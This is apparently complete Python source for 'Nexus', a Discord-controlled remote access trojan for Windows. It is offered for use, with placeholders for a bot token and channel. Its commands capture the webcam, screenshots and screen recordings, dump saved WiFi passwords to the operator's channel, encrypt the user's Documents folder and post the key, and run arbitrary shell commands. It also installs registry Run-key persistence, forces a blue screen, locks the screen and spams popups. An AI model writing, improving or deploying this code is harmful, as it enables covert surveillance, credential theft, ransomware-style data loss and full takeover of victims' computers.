import discord
from discord.ext import commands
import os
import subprocess
import sys
import ctypes
import platform
import io
import winreg
import winsound
import threading
import urllib.request
import socket
import cv2
import asyncio
import numpy as np
import mss
from PIL import ImageGrab, Image
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import pyfiglet
import webbrowser

# ===================== CONFIG =====================
TOKEN = 'YOUR TOKEN'
CHANNEL_ID = your channel id
PREFIX = '!'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

HOSTNAME = platform.node().lower()
SCRIPT_PATH = os.path.abspath(sys.argv[0])

# SSL Fix
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

# ===================== ON READY =====================
@bot.event
async def on_ready():
    print(f'[+] Nexus Client online → {HOSTNAME}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f"🖥️ **Nexus Connected:** `{HOSTNAME}` is now online.")

# ===================== IMPROVED MULTI-HOST ROUTER =====================
@bot.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID or message.author.bot:
        return await bot.process_commands(message)

    if not message.content.startswith(PREFIX):
        return await bot.process_commands(message)

    parts = message.content.strip().split()
    cmd = parts[0][1:].lower()

    if len(parts) < 2:
        return await bot.process_commands(message)

    target = parts[1].lower()

    # ONLY execute if targeted at this machine or "all"
    if target != "all" and target != HOSTNAME:
        return

    # Remove target argument
    if len(parts) > 2:
        message.content = PREFIX + cmd + " " + " ".join(parts[2:])
    else:
        message.content = PREFIX + cmd

    await bot.process_commands(message)

# ===================== ALL COMMANDS =====================

@bot.command()
async def devices(ctx):
    await ctx.send(f"**Active:** `{HOSTNAME}`")

@bot.command()
async def background(ctx, url: str):
    await ctx.send(f"🖼️ Changing background on `{HOSTNAME}`...")
    try:
        path = os.path.join(os.getenv('TEMP'), 'bg.jpg')
        urllib.request.urlretrieve(url, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await ctx.send(f"✅ Background changed on `{HOSTNAME}`")
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def popups(ctx, number: int, *, msg: str):
    await ctx.send(f"📢 Spawning {number} popups on `{HOSTNAME}`...")
    def spam():
        for _ in range(min(number, 3000)):
            try:
                messagebox.showerror("Nexus", msg)
                time.sleep(0.25)
            except: pass
    threading.Thread(target=spam, daemon=True).start()

@bot.command()
async def glitch(ctx):
    await ctx.send(f"⚡ Glitching `{HOSTNAME}`...")
    def play():
        for i in range(25):
            winsound.Beep(200 + i*80, 120)
            time.sleep(0.08)
    threading.Thread(target=play, daemon=True).start()

@bot.command()
async def texttospeech(ctx, *, text: str):
    await ctx.send(f"🗣️ Speaking on `{HOSTNAME}`...")
    def speak():
        subprocess.run(['powershell', '-Command', f'(New-Object -ComObject SAPI.SpVoice).Speak("{text}")'], shell=True)
    threading.Thread(target=speak, daemon=True).start()

@bot.command()
async def sysinfo(ctx):
    await ctx.send(f"**{HOSTNAME}**\nOS: {platform.system()} {platform.release()}\nUser: {os.getenv('USERNAME')}\nAdmin: {ctypes.windll.shell32.IsUserAnAdmin() != 0}")

@bot.command()
async def webcam(ctx):
    await ctx.send(f"📸 Webcam on `{HOSTNAME}`...")
    def capture():
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                with open('webcam.jpg', 'rb') as f:
                    asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(f, "webcam.jpg")), bot.loop)
                os.remove('webcam.jpg')
            cap.release()
        except:
            asyncio.run_coroutine_threadsafe(ctx.send("❌ Webcam failed"), bot.loop)
    threading.Thread(target=capture, daemon=True).start()

@bot.command()
async def wifidump(ctx):
    await ctx.send(f"📡 WiFi dump on `{HOSTNAME}`...")
    try:
        r = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, shell=True)
        profiles = [line.split(":",1)[1].strip() for line in r.stdout.splitlines() if "All User Profile" in line]
        out = "**WiFi Passwords:**\n"
        for p in profiles:
            rr = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name="{p}"', 'key=clear'], capture_output=True, text=True, shell=True)
            pw = next((line.split(":",1)[1].strip() for line in rr.stdout.splitlines() if "Key Content" in line), "None")
            out += f"{p} → `{pw}`\n"
        await ctx.send(out if len(out) < 1900 else discord.File(io.BytesIO(out.encode()), "wifi.txt"))
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def screenstream(ctx):
    await ctx.send(f"📹 Recording 30s on `{HOSTNAME}`...")
    def record():
        try:
            with mss.mss() as sct:
                mon = sct.monitors[1]
                out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*"mp4v"), 10, (mon["width"], mon["height"]))
                start = time.time()
                while time.time() - start < 30:
                    img = sct.grab(mon)
                    frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                    out.write(frame)
                out.release()
            with open("screen.mp4", "rb") as f:
                asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(f, "screen.mp4")), bot.loop)
            os.remove("screen.mp4")
        except Exception as e:
            asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Failed: {e}"), bot.loop)
    threading.Thread(target=record, daemon=True).start()

@bot.command()
async def encrypt(ctx, path: str = None):
    if not path: path = os.path.expanduser("~\\Documents")
    await ctx.send(f"🔐 Encrypting on `{HOSTNAME}`...")
    key = Fernet.generate_key()
    f = Fernet(key)
    count = 0
    for root, _, files in os.walk(path):
        for file in files:
            try:
                p = os.path.join(root, file)
                with open(p, "rb") as ff: data = ff.read()
                with open(p, "wb") as ff: ff.write(f.encrypt(data))
                count += 1
            except: continue
    await ctx.send(f"✅ Encrypted {count} files\n**Key:** `{key.decode()}`")

@bot.command()
async def decrypt(ctx, key: str, path: str = None):
    if not path: path = os.path.expanduser("~\\Documents")
    await ctx.send(f"🔓 Decrypting on `{HOSTNAME}`...")
    try:
        f = Fernet(key.encode())
        count = 0
        for root, _, files in os.walk(path):
            for file in files:
                try:
                    p = os.path.join(root, file)
                    with open(p, "rb") as ff: data = ff.read()
                    with open(p, "wb") as ff: ff.write(f.decrypt(data))
                    count += 1
                except: continue
        await ctx.send(f"✅ Decrypted {count} files")
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def freeze(ctx, url: str):
    await ctx.send(f"❄️ Freezing `{HOSTNAME}`...")
    try:
        img_path = os.path.join(os.getenv('TEMP'), 'freeze.jpg')
        urllib.request.urlretrieve(url, img_path)
        def lock():
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            img = tk.PhotoImage(file=img_path)
            tk.Label(root, image=img).pack()
            root.mainloop()
        threading.Thread(target=lock, daemon=True).start()
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def screenshot(ctx):
    await ctx.send(f"📸 Screenshot on `{HOSTNAME}`...")
    try:
        img = ImageGrab.grab()
        b = io.BytesIO()
        img.save(b, "PNG")
        b.seek(0)
        await ctx.send(file=discord.File(b, "screenshot.png"))
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def shutdown(ctx):
    await ctx.send(f"💀 Shutting down `{HOSTNAME}`...")
    os.system('shutdown /s /t 5')

@bot.command()
async def restart(ctx):
    await ctx.send(f"🔄 Restarting `{HOSTNAME}`...")
    os.system('shutdown /r /t 5')

@bot.command()
async def bsod(ctx):
    await ctx.send(f"💥 BSOD on `{HOSTNAME}`...")
    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000000, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))

@bot.command()
async def persistence(ctx):
    await ctx.send(f"🔒 Installing persistence on `{HOSTNAME}`...")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NexusClient", 0, winreg.REG_SZ, f'"{SCRIPT_PATH}"')
        winreg.CloseKey(key)
        await ctx.send("✅ Persistence installed")
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command()
async def execute(ctx, *, cmd: str):
    await ctx.send(f"⚙️ Running on `{HOSTNAME}`: {cmd}")
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        out = r.stdout + r.stderr
        if out:
            await ctx.send(f"```{out[:1800]}```" if len(out) < 1900 else discord.File(io.BytesIO(out.encode()), "output.txt"))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def url(ctx, *, url: str):
    if not url.startswith("http"):
        url = "https://" + url
    await ctx.send(f"🌐 Opening {url} on `{HOSTNAME}`")
    webbrowser.open(url, new=2)

@bot.command()
async def ascii(ctx, *, text: str):
    try:
        art = pyfiglet.figlet_format(text, font="big")
        await ctx.send(f"```ascii\n{art}\n```")
    except:
        await ctx.send(f"```{text.upper()}\n```")

@bot.command()
async def killbot(ctx):
    await ctx.send(f"🔌 Killing bot on `{HOSTNAME}`...")
    await bot.close()
    os._exit(0)

@bot.command()
async def help_admin(ctx):
    await ctx.send("""
**Nexus Commands** (use hostname or all)

!devices
!background <target> <url>
!popups <target> <num> <msg>
!glitch <target>
!texttospeech <target> <text>
!sysinfo <target>
!webcam <target>
!wifidump <target>
!screenstream <target>
!encrypt <target> [path]
!decrypt <target> <key> [path]
!freeze <target> <image_url>
!screenshot <target>
!shutdown <target>
!restart <target>
!bsod <target>
!persistence <target>
!execute <target> <cmd>
!url <target> <url>
!ascii <text>
!killbot <target>
    """)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"Error: {error}")

if __name__ == "__main__":
    print(f"Starting Nexus on {HOSTNAME}...")
    bot.run(TOKEN)
